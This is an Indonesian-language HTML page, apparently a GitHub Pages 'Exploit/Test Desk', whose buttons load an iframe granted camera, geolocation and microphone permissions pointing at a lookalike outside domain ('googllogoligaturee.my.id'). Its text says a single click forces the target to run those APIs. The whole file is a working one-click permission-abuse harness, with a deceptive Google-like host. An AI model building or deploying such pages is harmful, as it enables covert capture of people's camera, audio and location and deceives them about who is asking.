<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>GitHub Pages - 1-Click Origin Trigger</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; }
        .btn-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
        button { padding: 12px 20px; font-weight: bold; cursor: pointer; background: #0052cc; color: white; border: none; border-radius: 4px; }
        button:hover { background: #004099; }
        iframe { width: 100%; height: 400px; border: 1px solid #ccc; margin-top: 20px; }
    </style>
</head>
<body>

    <h2>Exploit/Test Desk: 1-Click Permission</h2>
    <p>Satu kali klik di bawah akan langsung memuat frame dan memaksa target mengeksekusi API secara instan.</p>

    <div class="btn-container">
        <button onclick="trigger('camera')">Trigger Kamera (1-Click)</button>
        <button onclick="trigger('location')">Trigger Lokasi (1-Click)</button>
        <button onclick="trigger('microphone')">Trigger Mikrofon (1-Click)</button>
    </div>

    <iframe id="exploitFrame" src="about:blank" allow="camera; geolocation; microphone"></iframe>

    <script>
        const TARGET = "https://googllogoligaturee.my.id/perm.html";

        function trigger(mode) {
            const frame = document.getElementById('exploitFrame');
            // 1-Click: Mengubah src secara instan dengan membawa parameter
            frame.src = `${TARGET}?mode=${mode}`;
        }
    </script>

</body>
</html>
